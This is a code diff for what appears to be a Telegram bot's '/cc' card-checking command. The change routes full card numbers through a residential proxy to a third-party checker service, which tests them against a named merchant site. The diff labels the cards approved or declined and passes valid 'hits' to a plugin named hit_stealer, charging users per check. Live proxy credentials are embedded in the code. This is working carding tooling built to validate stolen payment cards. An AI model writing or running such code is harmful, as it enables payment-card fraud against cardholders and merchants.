@@ -6,8 +6,6 @@ from plugins.func.users_sql import *
 from plugins.tools.hit_stealer import send_hit_if_approved
 from datetime import date
 
-API_URL = "https://barryxapi.xyz/str_auth"
-API_KEY = "BRY-HEIQ7-KPWYR-DRU67"
 session = requests.Session()
 
 @Client.on_message(filters.command("cc", prefixes=["/", "."]))
@@ -65,22 +63,26 @@ async def cmd_cc(Client, message):
 
         tic = time.perf_counter()
         try:
+            proxy_input = "proxy.proxiware.com:1337:user-default-network-res-country-us:OedbOv0g3JOQ"
+            site_input = "https://www.tekkabazzar.com"
+            kiltes_url = f"https://kiltes.lol/str/?proxy={proxy_input}&site={site_input}&cc={fullcc}"
+
             async with httpx.AsyncClient(timeout=25) as client:
-                res = await client.get(f"{API_URL}?key={API_KEY}&card={fullcc}")
+                res = await client.get(kiltes_url)
                 if res.status_code == 200:
-                    data = res.json()
-                    card_status = data.get("status", "").lower()
-                    card_message = data.get("message") or data.get("error") or res.text or "❌ Unknown response"
+                    try:
+                        data = res.json()
+                        card_message = data.get("result") or data.get("message") or data.get("error") or res.text
+                    except:
+                        card_message = res.text
                 else:
-                    card_status = "error"
                     card_message = f"❌ HTTP {res.status_code}"
         except Exception as e:
-            card_status = "error"
             card_message = f"❌ Request failed: {e}"
 
         toc = time.perf_counter()
 
-        # BIN Lookup with proxy fallback
+        # BIN Lookup
         try:
             proxy = "http://package-1111111-country-us:5671nuWwEPrHCw2t@proxy.rampageproxies.com:5000"
             headers = {"User-Agent": "Mozilla/5.0"}
@@ -100,9 +102,9 @@ async def cmd_cc(Client, message):
             flag = "🏳️"
 
         msg_lower = card_message.lower()
-        if any(k in msg_lower for k in ["approved", "success", "charged", "card added", "insufficient_funds", "incorrect_cvc"]):
+        if "payment method added" in msg_lower or "charged" in msg_lower:
             status = "Approved ✅"
-        elif any(k in msg_lower for k in ["declined", "pickup", "fraud", "stolen", "lost", "do not honor"]):
+        elif any(k in msg_lower for k in ["declined", "not support", "do not honor", "pickup", "fraud", "stolen", "lost"]):
             status = "Declined ❌"
         else:
             status = "Error"
@@ -123,7 +125,7 @@ async def cmd_cc(Client, message):
 
         await Client.edit_message_text(chat_id, check_msg.id, text=final_msg)
 
-        if "approved" in status.lower() or "live" in card_message.lower():
+        if "approved" in status.lower():
             await send_hit_if_approved(Client, final_msg)
 
         updatedata(user_id, "credits", credit - 1)
